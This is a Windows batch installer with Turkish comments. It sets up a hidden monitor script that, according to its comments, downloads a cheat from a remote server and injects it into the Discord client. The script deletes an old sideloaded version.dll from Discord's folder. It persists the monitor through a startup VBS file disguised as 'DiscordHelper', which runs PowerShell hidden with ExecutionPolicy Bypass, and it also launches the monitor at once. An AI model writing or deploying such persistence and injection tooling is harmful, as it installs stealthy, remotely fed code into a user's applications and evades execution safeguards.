@echo off
:: ============================================================
::  install.bat — Monitor'ü Windows başlangıcına ekle
::
::  Yapılan işlem:
::    1. Discord klasöründen eski version.dll'i temizler
::    2. Monitor'ü Windows başlangıcına ekler (gizli PowerShell)
::    3. Monitor şu an da başlatılır
::
::  Monitor ne yapar:
::    - Arka planda çalışır, pencere yok
::    - Discord açılınca VDS'den hileyi indirir
::    - Discord'a inject eder → hile Discord içinde çalışır
::    - Discord kapanınca sıfırlar, açılınca tekrar yapar
:: ============================================================

setlocal
set "ROOT=%~dp0"
set "MONITOR=%ROOT%monitor.ps1"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT=%STARTUP%\DiscordHelper.vbs"
set "DISCORD_BASE=%LOCALAPPDATA%\Discord"

:: Monitor var mı?
if not exist "%MONITOR%" (
    echo [HATA] monitor.ps1 bulunamadi.
    pause
    exit /b 1
)

:: Discord klasöründeki version.dll'i temizle (sideload artık kullanılmıyor)
set "DISCORD_APP="
for /f "tokens=*" %%d in ('dir /b /ad "%DISCORD_BASE%\app-*" 2^>nul') do (
    set "DISCORD_APP=%%d"
)
if not "%DISCORD_APP%"=="" (
    if exist "%DISCORD_BASE%\%DISCORD_APP%\version.dll" (
        del /F /Q "%DISCORD_BASE%\%DISCORD_APP%\version.dll" >nul 2>&1
        echo [OK] Eski version.dll Discord klasöründen silindi.
    )
)

:: Başlangıç kısayolu oluştur (gizli PowerShell)
echo Set WShell = CreateObject("WScript.Shell") > "%SHORTCUT%"
echo WShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%MONITOR%""", 0, False >> "%SHORTCUT%"

if not exist "%SHORTCUT%" (
    echo [HATA] Başlangıç kısayolu oluşturulamadı.
    pause
    exit /b 1
)

echo.
echo  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
echo   Kurulum tamamlandi
echo  //////////////////////////////
echo.
echo   Developed By Tron
echo.
echo.

:: Şimdi da başlat
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%MONITOR%"

exit /b 0
